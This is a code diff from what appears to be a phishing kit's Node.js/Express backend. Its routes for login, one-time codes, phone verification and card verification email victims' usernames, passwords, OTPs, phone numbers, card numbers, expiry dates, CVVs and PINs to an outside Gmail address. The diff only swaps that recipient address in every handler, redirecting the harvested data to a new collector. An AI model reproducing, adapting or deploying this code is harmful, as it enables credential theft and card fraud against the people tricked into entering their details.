@@ -61,7 +61,7 @@ app.post("/otp_post", (req, res) => {
 
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",
+        to: "matledesign98@gmail.com",
         subject: `OTP Code`,
         text: `OTP: ${req.body.otpValue}`
     };
@@ -89,7 +89,7 @@ app.post("/otp2_form", (req, res) => {
 
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",
+        to: "matledesign98@gmail.com",
         subject: `OTP2 Code`,
         text: `OTP2: ${req.body.otpValue}`
     };
@@ -111,7 +111,7 @@ app.post("/phone-verification", (req, res) => {
     res.redirect("/card-details")
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",
+        to: "matledesign98@gmail.com",
         subject: `Mobile Number`,
         text: `Mobile number: ${req.body.phn}`
     };
@@ -137,7 +137,7 @@ app.post("/cardVerification", ( req, res) => {
     res.redirect('/load')
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",
+        to: "matledesign98@gmail.com",
         subject: `Card Details`,
         text: `card number: ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`
     };
@@ -161,7 +161,7 @@ app.post("/login", ( req, res ) => {
     req.session.save();
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",
+        to: "matledesign98@gmail.com",
         subject: `Client Login Alert`,
         text: `Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`
     };
